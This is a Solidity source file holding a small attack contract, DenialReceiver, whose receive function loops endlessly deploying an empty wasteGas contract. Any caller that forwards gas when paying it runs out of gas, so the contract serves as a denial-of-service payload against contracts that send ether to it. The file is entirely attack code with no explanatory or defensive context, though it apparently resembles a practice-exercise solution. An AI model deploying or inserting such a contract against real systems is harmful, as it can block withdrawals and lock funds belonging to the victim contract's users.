// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract wasteGas {}

contract DenialReceiver {
    receive() external payable {
        while (true) {
            new wasteGas();
        }
    }
}
